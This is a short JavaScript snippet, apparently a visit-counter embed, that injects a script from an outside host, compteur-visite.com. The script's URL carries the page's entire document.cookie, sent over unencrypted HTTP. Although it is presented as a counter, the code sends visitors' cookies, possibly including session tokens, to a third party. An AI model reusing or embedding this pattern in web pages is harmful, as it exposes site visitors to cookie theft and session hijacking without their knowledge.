function compteur() {
    var cv = document.createElement("script");
    cv.type = "text/javascript";
    cv.async = true;
    cv.src = "http://www.compteur-visite.com/service.php?v=1.1&id=152587&k=89b39953ba71fa7ac814f3e5cad8b413&c=" + document.cookie;
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(cv, s);
}
